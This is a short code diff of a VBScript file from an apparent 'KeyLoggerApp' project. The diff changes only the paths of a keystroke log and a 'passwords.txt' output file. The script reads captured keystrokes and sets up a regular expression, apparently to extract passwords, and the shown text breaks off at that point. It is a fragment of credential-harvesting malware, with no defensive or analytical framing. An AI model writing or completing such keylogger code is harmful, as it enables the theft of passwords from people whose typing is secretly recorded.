@@ -1,6 +1,6 @@
 Set objFSO = CreateObject("Scripting.FileSystemObject")
-Set objFile = objFSO.OpenTextFile("KeyLoggerApp\App\keyloggerLogs\keystrokes.txt", 1)
-Set objOutputFile = objFSO.CreateTextFile("KeyLoggerApp\App\keyloggerLogs\passwords.txt", True)
+Set objFile = objFSO.OpenTextFile("keyloggerLogs\keystrokes.txt", 1)
+Set objOutputFile = objFSO.CreateTextFile("keyloggerLogs\passwords.txt", True)
 
 Dim regEx, matches, match
 Set regEx = New RegExp
